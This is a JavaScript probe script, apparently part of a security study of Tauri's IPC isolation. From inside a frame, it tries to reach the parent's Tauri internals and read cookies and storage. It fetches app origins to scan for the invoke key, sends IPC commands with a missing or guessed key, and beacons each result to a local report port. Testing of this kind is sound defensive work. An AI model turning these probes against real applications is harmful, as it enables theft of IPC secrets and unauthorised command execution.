// M1 A2: the ACL is open for this origin (remote variant) and the frame is NOT handed the key.
// Try to obtain the bridge or the invoke key by itself; then try the commands without it.
let REP = null;
const rep = (k, v) => { try { new Image().src = 'http://127.0.0.1:' + REP + '/r?' + encodeURIComponent(k) + '=' + encodeURIComponent(String(v)); } catch (e) {} };
window.addEventListener('message', async (ev) => {
  if (!ev.data || ev.data.m1 !== 'cfg') return;
  const { cfg, key } = ev.data;
  REP = cfg.report;
  rep('A2_variant', cfg.variant + ' key_handed=' + (key ? 'YES' : 'no'));
  const probe = (label, fn) => { try { const v = fn(); rep(label, 'ok: ' + (typeof v === 'string' ? v.slice(0, 120) : typeof v)); } catch (e) { rep(label, 'threw ' + (e && e.name) + ': ' + String(e).slice(0, 100)); } };
  probe('A2_parent_internals', () => window.parent.__TAURI_INTERNALS__);
  probe('A2_top_internals', () => window.top.__TAURI_INTERNALS__);
  probe('A2_parent_location', () => window.parent.location.href);
  probe('A2_parent_document', () => window.parent.document.title);
  probe('A2_parent_frames', () => String(window.parent.frames.length));
  probe('A2_opener', () => String(window.opener));
  probe('A2_name', () => window.name || '(empty)');
  probe('A2_cookie', () => document.cookie || '(empty)');
  probe('A2_localStorage', () => localStorage.length);
  probe('A2_referrer', () => document.referrer || '(empty)');
  probe('A2_ancestorOrigins', () => JSON.stringify(Array.from(location.ancestorOrigins || [])));
  probe('A2_own_globals', () => Object.getOwnPropertyNames(window).filter(n => /tauri|ipc|invoke|wry/i.test(n)).join(',') || '(none)');
  // fetch the app origin's documents/scripts and scan for the key
  for (const base of ['tauri://localhost/', 'http://tauri.localhost/', 'https://tauri.localhost/']) {
    try {
      const r = await fetch(base, { mode: 'no-cors' });
      rep('A2_fetch_' + base, 'status=' + r.status + ' type=' + r.type);
      if (r.type !== 'opaque') { const t = await r.text(); rep('A2_fetch_text_' + base, 'len=' + t.length + ' hasKeyWord=' + /INVOKE_KEY|invoke_key/.test(t)); }
    } catch (e) { rep('A2_fetch_' + base, 'threw ' + e); }
  }
  // commands without the key
  const wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.ipc;
  for (const [label, k] of [['nokey', undefined], ['emptykey', ''], ['guess', 'aaaaaaaaaaaaaaaaaaaa']]) {
    try { wk.postMessage(JSON.stringify({ cmd: 'addon_canary', callback: 1, error: 2, payload: { arg: 'A2-' + label }, options: {}, __TAURI_INVOKE_KEY__: k })); rep('A2_post_' + label, 'sent'); } catch (e) { rep('A2_post_' + label, 'threw ' + e); }
  }
  // the key has to be reachable some way: sniff what the injected main-frame scripts leave on shared prototypes
  probe('A2_proto_leak', () => Object.getOwnPropertyNames(Object.prototype).filter(n => /tauri|key/i.test(n)).join(',') || '(none)');
  rep('A2_done', 1);
});
